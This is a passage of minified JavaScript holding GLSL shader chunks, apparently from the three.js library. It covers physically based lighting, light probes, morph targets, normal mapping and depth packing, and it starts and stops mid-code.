	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	#ifdef USE_CLEARCOAT
		float dotNLcc = saturate( dot( geometryClearcoatNormal, directLight.direction ) );
		vec3 ccIrradiance = dotNLcc * directLight.color;
		clearcoatSpecularDirect += ccIrradiance * BRDF_GGX_Clearcoat( directLight.direction, geometryViewDir, geometryClearcoatNormal, material );
	#endif
	#ifdef USE_SHEEN
 
 		sheenSpecularDirect += irradiance * BRDF_Sheen( directLight.direction, geometryViewDir, geometryNormal, material.sheenColor, material.sheenRoughness );
 
 		float sheenAlbedoV = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
 		float sheenAlbedoL = IBLSheenBRDF( geometryNormal, directLight.direction, material.sheenRoughness );
 
 		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * max( sheenAlbedoV, sheenAlbedoL );
 
 		irradiance *= sheenEnergyComp;
 
 	#endif
	vec3 specularBRDF = BRDF_GGX( directLight.direction, geometryViewDir, geometryNormal, material );
	#ifdef USE_RETROREFLECTION
		vec3 retroViewDir = reflect( - geometryViewDir, geometryNormal );
		vec3 retroSpecularBRDF = BRDF_GGX( directLight.direction, retroViewDir, geometryNormal, material );
		specularBRDF = mix( specularBRDF, retroSpecularBRDF, saturate( material.retroreflectivity ) );
	#endif
	reflectedLight.directSpecular += irradiance * specularBRDF * material.multiScatteringCompensation;
	vec3 halfDir = normalize( directLight.direction + geometryViewDir );
	float dotVH = saturate( dot( geometryViewDir, halfDir ) );
	vec3 F = F_Schlick( material.specularColor, material.specularF90, dotVH );
	#ifdef USE_RETROREFLECTION
		vec3 retroHalfDir = normalize( directLight.direction + retroViewDir );
		float dotRetroVH = saturate( dot( retroViewDir, retroHalfDir ) );
		vec3 retroF = F_Schlick( material.specularColor, material.specularF90, dotRetroVH );
		F = mix( F, retroF, saturate( material.retroreflectivity ) );
	#endif
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseContribution ) * ( 1.0 - F );
}
void RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 singleScattering = vec3( 0.0 );
	vec3 multiScattering = vec3( 0.0 );
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( material.dfg, material.specularColor, material.specularF90, material.iridescence, material.iridescenceF0Dielectric, singleScattering, multiScattering );
	#else
		computeMultiscattering( material.dfg, material.specularColor, material.specularF90, singleScattering, multiScattering );
	#endif
	vec3 diffuse = irradiance * BRDF_Lambert( material.diffuseContribution ) * ( 1.0 - singleScattering - multiScattering );
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		sheenSpecularIndirect += irradiance * material.sheenColor * sheenAlbedo * RECIPROCAL_PI;
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		diffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectDiffuse += diffuse;
}
void RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {
	#ifdef USE_CLEARCOAT
		clearcoatSpecularIndirect += clearcoatRadiance * EnvironmentBRDF( geometryClearcoatNormal, geometryViewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularIndirect += irradiance * material.sheenColor * IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness ) * RECIPROCAL_PI;
 	#endif
	vec3 singleScatteringDielectric = vec3( 0.0 );
	vec3 multiScatteringDielectric = vec3( 0.0 );
	vec3 singleScatteringMetallic = vec3( 0.0 );
	vec3 multiScatteringMetallic = vec3( 0.0 );
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( material.dfg, material.specularColor, material.specularF90, material.iridescence, material.iridescenceF0Dielectric, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscatteringIridescence( material.dfg, material.diffuseColor, material.specularF90, material.iridescence, material.iridescenceF0Metallic, singleScatteringMetallic, multiScatteringMetallic );
	#else
		computeMultiscattering( material.dfg, material.specularColor, material.specularF90, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscattering( material.dfg, material.diffuseColor, material.specularF90, singleScatteringMetallic, multiScatteringMetallic );
	#endif
	vec3 singleScattering = mix( singleScatteringDielectric, singleScatteringMetallic, material.metalness );
	vec3 multiScattering = mix( multiScatteringDielectric, multiScatteringMetallic, material.metalness );
	vec3 totalScatteringDielectric = singleScatteringDielectric + multiScatteringDielectric;
	vec3 diffuse = material.diffuseContribution * ( 1.0 - totalScatteringDielectric );
	vec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;
	vec3 indirectSpecular = radiance * singleScattering;
	indirectSpecular += multiScattering * cosineWeightedIrradiance;
	vec3 indirectDiffuse = diffuse * cosineWeightedIrradiance;
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		indirectSpecular *= sheenEnergyComp;
		indirectDiffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectSpecular += indirectSpecular;
	reflectedLight.indirectDiffuse += indirectDiffuse;
}
#define RE_Direct				RE_Direct_Physical
#define RE_Direct_RectArea		RE_Direct_RectArea_Physical
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Physical
#define RE_IndirectSpecular		RE_IndirectSpecular_Physical
float computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {
	return saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );
}`,BT=`
vec3 geometryPosition = - vViewPosition;
vec3 geometryNormal = normal;
vec3 geometryViewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );
vec3 geometryClearcoatNormal = vec3( 0.0 );
#ifdef USE_CLEARCOAT
	geometryClearcoatNormal = clearcoatNormal;
#endif
#ifdef USE_IRIDESCENCE
	float dotNVi = saturate( dot( normal, geometryViewDir ) );
	if ( material.iridescenceThickness == 0.0 ) {
		material.iridescence = 0.0;
	} else {
		material.iridescence = saturate( material.iridescence );
	}
	if ( material.iridescence > 0.0 ) {
		vec3 iridescenceFresnelDielectric = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.specularColor );
		vec3 iridescenceFresnelMetallic = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.diffuseColor );
		material.iridescenceFresnel = mix( iridescenceFresnelDielectric, iridescenceFresnelMetallic, material.metalness );
		material.iridescenceF0Dielectric = Schlick_to_F0( iridescenceFresnelDielectric, 1.0, dotNVi );
		material.iridescenceF0Metallic = Schlick_to_F0( iridescenceFresnelMetallic, 1.0, dotNVi );
	}
#endif
#ifdef STANDARD
	float dotNVms = saturate( dot( geometryNormal, geometryViewDir ) );
	material.dfg = texture2D( dfgLUT, vec2( material.roughness, dotNVms ) ).rg;
	#if ( NUM_SUN_LIGHTS > 0 || NUM_DIR_LIGHTS > 0 || NUM_POINT_LIGHTS > 0 || NUM_SPOT_LIGHTS > 0 )
		float EssMs = material.dfg.x + material.dfg.y;
		material.multiScatteringCompensation = 1.0 + material.specularColorBlended * ( 1.0 / EssMs - 1.0 );
	#endif
#endif
IncidentLight directLight;
#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )
	PointLight pointLight;
	#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {
		pointLight = pointLights[ i ];
		getPointLightInfo( pointLight, geometryPosition, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS ) && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
		pointLightShadow = pointLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowIntensity, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )
	SpotLight spotLight;
	vec4 spotColor;
	vec3 spotLightCoord;
	bool inSpotLightMap;
	#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {
		spotLight = spotLights[ i ];
		getSpotLightInfo( spotLight, geometryPosition, directLight );
		#if ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#define SPOT_LIGHT_MAP_INDEX UNROLLED_LOOP_INDEX
		#elif ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		#define SPOT_LIGHT_MAP_INDEX NUM_SPOT_LIGHT_MAPS
		#else
		#define SPOT_LIGHT_MAP_INDEX ( UNROLLED_LOOP_INDEX - NUM_SPOT_LIGHT_SHADOWS + NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#endif
		#if ( SPOT_LIGHT_MAP_INDEX < NUM_SPOT_LIGHT_MAPS )
			spotLightCoord = vSpotLightCoord[ i ].xyz / vSpotLightCoord[ i ].w;
			inSpotLightMap = all( lessThan( abs( spotLightCoord * 2. - 1. ), vec3( 1.0 ) ) );
			spotColor = texture2D( spotLightMap[ SPOT_LIGHT_MAP_INDEX ], spotLightCoord.xy );
			directLight.color = inSpotLightMap ? directLight.color * spotColor.rgb : directLight.color;
		#endif
		#undef SPOT_LIGHT_MAP_INDEX
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		spotLightShadow = spotLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowIntensity, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SUN_LIGHTS > 0 ) && defined( RE_Direct )
	SunLight sunLight;
	#if defined( USE_SHADOWMAP ) && NUM_SUN_LIGHT_SHADOWS > 0
	SunLightShadow sunLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SUN_LIGHTS; i ++ ) {
		sunLight = sunLights[ i ];
		getSunLightInfo( sunLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SUN_LIGHT_SHADOWS )
		sunLightShadow = sunLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getSunShadow( sunShadowMap[ i ], sunLightShadow, UNROLLED_LOOP_INDEX ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )
	DirectionalLight directionalLight;
	#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {
		directionalLight = directionalLights[ i ];
		getDirectionalLightInfo( directionalLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )
		directionalLightShadow = directionalLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowIntensity, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )
	RectAreaLight rectAreaLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {
		rectAreaLight = rectAreaLights[ i ];
		RE_Direct_RectArea( rectAreaLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if defined( RE_IndirectDiffuse )
	vec3 iblIrradiance = vec3( 0.0 );
	vec3 irradiance = getAmbientLightIrradiance( ambientLightColor );
	#if defined( USE_LIGHT_PROBES )
		irradiance += getLightProbeIrradiance( lightProbe, geometryNormal );
	#endif
	#if ( NUM_HEMI_LIGHTS > 0 )
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {
			irradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometryNormal );
		}
		#pragma unroll_loop_end
	#endif
	#ifdef USE_LIGHT_PROBES_GRID
		vec3 probeWorldPos = ( ( vec4( geometryPosition, 1.0 ) - viewMatrix[ 3 ] ) * viewMatrix ).xyz;
		vec3 probeWorldNormal = transformNormalByInverseViewMatrix( geometryNormal, viewMatrix );
		irradiance += getLightProbeGridIrradiance( probeWorldPos, probeWorldNormal );
	#endif
#endif
#if defined( RE_IndirectSpecular )
	vec3 radiance = vec3( 0.0 );
	vec3 clearcoatRadiance = vec3( 0.0 );
#endif`,FT=`#if defined( RE_IndirectDiffuse )
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
		irradiance += lightMapIrradiance;
	#endif
	#if defined( USE_ENVMAP ) && defined( ENVMAP_TYPE_CUBE_UV )
		#if defined( STANDARD ) || defined( LAMBERT ) || defined( PHONG )
			iblIrradiance += getIBLIrradiance( geometryNormal );
		#endif
	#endif
#endif
#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )
	#ifdef USE_ANISOTROPY
		vec3 iblRadiance = getIBLAnisotropyRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
	#else
		vec3 iblRadiance = getIBLRadiance( geometryViewDir, geometryNormal, material.roughness );
	#endif
	#ifdef USE_RETROREFLECTION
		#ifdef USE_ANISOTROPY
			vec3 retroIBLRadiance = getIBLAnisotropyRetroRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
		#else
			vec3 retroIBLRadiance = getIBLRetroRadiance( geometryViewDir, geometryNormal, material.roughness );
		#endif
		iblRadiance = mix( iblRadiance, retroIBLRadiance, saturate( material.retroreflectivity ) );
	#endif
	radiance += iblRadiance;
	#ifdef USE_CLEARCOAT
		clearcoatRadiance += getIBLRadiance( geometryViewDir, geometryClearcoatNormal, material.clearcoatRoughness );
	#endif
#endif`,HT=`#if defined( RE_IndirectDiffuse )
	#if defined( LAMBERT ) || defined( PHONG )
		irradiance += iblIrradiance;
	#endif
	RE_IndirectDiffuse( irradiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif
#if defined( RE_IndirectSpecular )
	RE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif`,GT=`#ifdef USE_LIGHT_PROBES_GRID
uniform highp sampler3D probesSH;
uniform vec3 probesMin;
uniform vec3 probesMax;
uniform vec3 probesResolution;
vec3 getLightProbeGridIrradiance( vec3 worldPos, vec3 worldNormal ) {
	vec3 res = probesResolution;
	vec3 gridRange = probesMax - probesMin;
	vec3 resMinusOne = res - 1.0;
	vec3 probeSpacing = gridRange / resMinusOne;
	vec3 samplePos = worldPos + worldNormal * probeSpacing * 0.5;
	vec3 uvw = clamp( ( samplePos - probesMin ) / gridRange, 0.0, 1.0 );
	uvw = uvw * resMinusOne / res + 0.5 / res;
	float nz          = res.z;
	float paddedSlices = nz + 2.0;
	float atlasDepth  = 7.0 * paddedSlices;
	float uvZBase     = uvw.z * nz + 1.0;
	vec4 s0 = texture( probesSH, vec3( uvw.xy, ( uvZBase                       ) / atlasDepth ) );
	vec4 s1 = texture( probesSH, vec3( uvw.xy, ( uvZBase +       paddedSlices   ) / atlasDepth ) );
	vec4 s2 = texture( probesSH, vec3( uvw.xy, ( uvZBase + 2.0 * paddedSlices   ) / atlasDepth ) );
	vec4 s3 = texture( probesSH, vec3( uvw.xy, ( uvZBase + 3.0 * paddedSlices   ) / atlasDepth ) );
	vec4 s4 = texture( probesSH, vec3( uvw.xy, ( uvZBase + 4.0 * paddedSlices   ) / atlasDepth ) );
	vec4 s5 = texture( probesSH, vec3( uvw.xy, ( uvZBase + 5.0 * paddedSlices   ) / atlasDepth ) );
	vec4 s6 = texture( probesSH, vec3( uvw.xy, ( uvZBase + 6.0 * paddedSlices   ) / atlasDepth ) );
	vec3 c0 = s0.xyz;
	vec3 c1 = vec3( s0.w, s1.xy );
	vec3 c2 = vec3( s1.zw, s2.x );
	vec3 c3 = s2.yzw;
	vec3 c4 = s3.xyz;
	vec3 c5 = vec3( s3.w, s4.xy );
	vec3 c6 = vec3( s4.zw, s5.x );
	vec3 c7 = s5.yzw;
	vec3 c8 = s6.xyz;
	float x = worldNormal.x, y = worldNormal.y, z = worldNormal.z;
	vec3 result = c0 * 0.886227;
	result += c1 * 2.0 * 0.511664 * y;
	result += c2 * 2.0 * 0.511664 * z;
	result += c3 * 2.0 * 0.511664 * x;
	result += c4 * 2.0 * 0.429043 * x * y;
	result += c5 * 2.0 * 0.429043 * y * z;
	result += c6 * ( 0.743125 * z * z - 0.247708 );
	result += c7 * 2.0 * 0.429043 * x * z;
	result += c8 * 0.429043 * ( x * x - y * y );
	return max( result, vec3( 0.0 ) );
}
#endif`,VT=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	gl_FragDepth = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;
#endif`,XT=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	uniform float logDepthBufFC;
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,kT=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,WT=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	vFragDepth = 1.0 + gl_Position.w;
	vIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );
#endif`,qT=`#ifdef USE_MAP
	vec4 sampledDiffuseColor = texture2D( map, vMapUv );
	#ifdef DECODE_VIDEO_TEXTURE
		sampledDiffuseColor = sRGBTransferEOTF( sampledDiffuseColor );
	#endif
	diffuseColor *= sampledDiffuseColor;
#endif`,YT=`#ifdef USE_MAP
	uniform sampler2D map;
#endif`,ZT=`#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
	#if defined( USE_POINTS_UV )
		vec2 uv = vUv;
	#else
		vec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;
	#endif
#endif
#ifdef USE_MAP
	diffuseColor *= texture2D( map, uv );
#endif
#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, uv ).g;
#endif`,KT=`#if defined( USE_POINTS_UV )
	varying vec2 vUv;
#else
	#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
		uniform mat3 uvTransform;
	#endif
#endif
#ifdef USE_MAP
	uniform sampler2D map;
#endif
#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,jT=`float metalnessFactor = metalness;
#ifdef USE_METALNESSMAP
	vec4 texelMetalness = texture2D( metalnessMap, vMetalnessMapUv );
	metalnessFactor *= texelMetalness.b;
#endif`,QT=`#ifdef USE_METALNESSMAP
	uniform sampler2D metalnessMap;
#endif`,JT=`#ifdef USE_INSTANCING_MORPH
	float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	float morphTargetBaseInfluence = texelFetch( morphTexture, ivec2( 0, gl_InstanceID ), 0 ).r;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		morphTargetInfluences[i] =  texelFetch( morphTexture, ivec2( i + 1, gl_InstanceID ), 0 ).r;
	}
#endif`,$T=`#if defined( USE_MORPHCOLORS )
	vColor *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		#if defined( USE_COLOR_ALPHA )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ) * morphTargetInfluences[ i ];
		#elif defined( USE_COLOR )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ).rgb * morphTargetInfluences[ i ];
		#endif
	}
#endif`,t1=`#ifdef USE_MORPHNORMALS
	objectNormal *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,e1=`#ifdef USE_MORPHTARGETS
	#ifndef USE_INSTANCING_MORPH
		uniform float morphTargetBaseInfluence;
		uniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	#endif
	uniform sampler2DArray morphTargetsTexture;
	uniform ivec2 morphTargetsTextureSize;
	vec4 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset ) {
		int texelIndex = vertexIndex * MORPHTARGETS_TEXTURE_STRIDE + offset;
		int y = texelIndex / morphTargetsTextureSize.x;
		int x = texelIndex - y * morphTargetsTextureSize.x;
		ivec3 morphUV = ivec3( x, y, morphTargetIndex );
		return texelFetch( morphTargetsTexture, morphUV, 0 );
	}
#endif`,n1=`#ifdef USE_MORPHTARGETS
	transformed *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) transformed += getMorph( gl_VertexID, i, 0 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,i1=`float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;
#ifdef FLAT_SHADED
	vec3 fdx = dFdx( vViewPosition );
	vec3 fdy = dFdy( vViewPosition );
	vec3 normal = normalize( cross( fdx, fdy ) );
#else
	vec3 normal = normalize( vNormal );
	#ifdef DOUBLE_SIDED
		normal *= faceDirection;
	#endif
#endif
#if defined( USE_NORMALMAP_TANGENTSPACE ) || defined( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY )
	#ifdef USE_TANGENT
		mat3 tbn = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn = getTangentFrame( - vViewPosition, normal,
		#if defined( USE_NORMALMAP )
			vNormalMapUv
		#elif defined( USE_CLEARCOAT_NORMALMAP )
			vClearcoatNormalMapUv
		#else
			vUv
		#endif
		);
	#endif
	#ifdef DOUBLE_SIDED
		tbn[0] *= faceDirection;
		tbn[1] *= faceDirection;
	#endif
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	#ifdef USE_TANGENT
		mat3 tbn2 = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn2 = getTangentFrame( - vViewPosition, normal, vClearcoatNormalMapUv );
	#endif
	#ifdef DOUBLE_SIDED
		tbn2[0] *= faceDirection;
		tbn2[1] *= faceDirection;
	#endif
#endif
vec3 nonPerturbedNormal = normal;`,a1=`#ifdef USE_NORMALMAP_OBJECTSPACE
	normal = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#ifdef FLIP_SIDED
		normal = - normal;
	#endif
	#ifdef DOUBLE_SIDED
		normal = normal * faceDirection;
	#endif
	normal = normalize( normalMatrix * normal );
#elif defined( USE_NORMALMAP_TANGENTSPACE )
	vec3 mapN = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#if defined( USE_PACKED_NORMALMAP )
		mapN = vec3( mapN.xy, sqrt( saturate( 1.0 - dot( mapN.xy, mapN.xy ) ) ) );
	#endif
	mapN.xy *= normalScale;
	normal = normalize( tbn * mapN );
#elif defined( USE_BUMPMAP )
	normal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );
#endif`,r1=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,s1=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,o1=`#ifndef FLAT_SHADED
	vNormal = normalize( transformedNormal );
	#ifdef USE_TANGENT
		vTangent = normalize( transformedTangent );
		vBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );
		#ifdef FLIP_SIDED
			vBitangent = - vBitangent;
		#endif
	#endif
#endif`,l1=`#ifdef USE_NORMALMAP
	uniform sampler2D normalMap;
	uniform vec2 normalScale;
#endif
#ifdef USE_NORMALMAP_OBJECTSPACE
	uniform mat3 normalMatrix;
#endif
#if ! defined ( USE_TANGENT ) && ( defined ( USE_NORMALMAP_TANGENTSPACE ) || defined ( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY ) )
	mat3 getTangentFrame( vec3 eye_pos, vec3 surf_norm, vec2 uv ) {
		vec3 q0 = dFdx( eye_pos.xyz );
		vec3 q1 = dFdy( eye_pos.xyz );
		vec2 st0 = dFdx( uv.st );
		vec2 st1 = dFdy( uv.st );
		vec3 N = surf_norm;
		vec3 q1perp = cross( q1, N );
		vec3 q0perp = cross( N, q0 );
		vec3 T = q1perp * st0.x + q0perp * st1.x;
		vec3 B = q1perp * st0.y + q0perp * st1.y;
		float det = max( dot( T, T ), dot( B, B ) );
		float scale = ( det == 0.0 ) ? 0.0 : inversesqrt( det );
		return mat3( T * scale, B * scale, N );
	}
#endif`,c1=`#ifdef USE_CLEARCOAT
	vec3 clearcoatNormal = nonPerturbedNormal;
#endif`,u1=`#ifdef USE_CLEARCOAT_NORMALMAP
	vec3 clearcoatMapN = texture2D( clearcoatNormalMap, vClearcoatNormalMapUv ).xyz * 2.0 - 1.0;
	clearcoatMapN.xy *= clearcoatNormalScale;
	clearcoatNormal = normalize( tbn2 * clearcoatMapN );
#endif`,f1=`#ifdef USE_CLEARCOATMAP
	uniform sampler2D clearcoatMap;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform sampler2D clearcoatNormalMap;
	uniform vec2 clearcoatNormalScale;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform sampler2D clearcoatRoughnessMap;
#endif`,d1=`#ifdef USE_IRIDESCENCEMAP
	uniform sampler2D iridescenceMap;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform sampler2D iridescenceThicknessMap;
#endif`,h1=`#ifdef OPAQUE
diffuseColor.a = 1.0;
#endif
#ifdef USE_TRANSMISSION
diffuseColor.a *= material.transmissionAlpha;
#endif
gl_FragColor = vec4( outgoingLight, diffuseColor.a );`,p1=`vec3 packNormalToRGB( const in vec3 normal ) {
	return normalize( normal ) * 0.5 + 0.5;
}
vec3 unpackRGBToNormal( const in vec3 rgb ) {
	return 2.0 * rgb.xyz - 1.0;
}
const float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;const float ShiftRight8 = 1. / 256.;
const float Inv255 = 1. / 255.;
const vec4 PackFactors = vec4( 1.0, 256.0, 256.0 * 256.0, 256.0 * 256.0 * 256.0 );
const vec2 UnpackFactors2 = vec2( UnpackDownscale, 1.0 / PackFactors.g );
const vec3 UnpackFactors3 = vec3( UnpackDownscale / PackFactors.rg, 1.0 / PackFactors.b );
const vec4 UnpackFactors4 = vec4( UnpackDownscale / PackFactors.rgb, 1.0 / PackFactors.a );
vec4 packDepthToRGBA( const in float v ) {
	if( v <= 0.0 )
		return vec4( 0., 0., 0., 0. );
	if( v >= 1.0 )
		return vec4( 1., 1., 1., 1. );
	float vuf;
	float af = modf( v * PackFactors.a, vuf );
	float bf = modf( vuf * ShiftRight8, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec4( vuf * Inv255, gf * PackUpscale, bf * PackUpscale, af );
}
vec3 packDepthToRGB( const in float v ) {
	if( v <= 0.0 )
		return vec3( 0., 0., 0. );
	if( v >= 1.0 )
		return vec3( 1., 1., 1. );
	float vuf;
	float bf = modf( v * PackFactors.b, vuf );
	float gf = modf( vuf * ShiftRight8, vuf );
	return vec3( vuf * Inv255, gf * PackUpscale, bf );
}
vec2 packDepthToRG( const in float v ) {
	if( v <= 0.0 )
